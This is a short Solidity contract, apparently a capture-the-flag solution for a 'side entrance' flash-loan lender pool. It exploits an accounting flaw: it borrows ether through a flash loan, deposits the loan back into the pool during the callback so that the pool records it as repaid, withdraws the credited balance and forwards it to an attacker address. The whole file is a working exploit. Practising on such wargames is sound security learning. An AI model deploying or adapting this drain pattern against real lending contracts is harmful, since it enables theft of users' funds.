// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";

interface IPool {
    function deposit() external payable;
    function flashLoan(uint256 amount) external;
    function withdraw() external;

}
contract AttackSideEntranceLenderPool {
    address attackPool;
    address payable attacker;
    constructor(address pool, address attackerAddr) {
        attackPool = pool;
        attacker = payable(attackerAddr);
    }
    function attack(uint256 amount) external {
        IPool(attackPool).flashLoan(amount);
        IPool(attackPool).withdraw();
    }

     function execute() external payable{
        IPool(attackPool).deposit{value: msg.value}();
    }

    receive () external payable {
        attacker.transfer(msg.value);
    }
}
 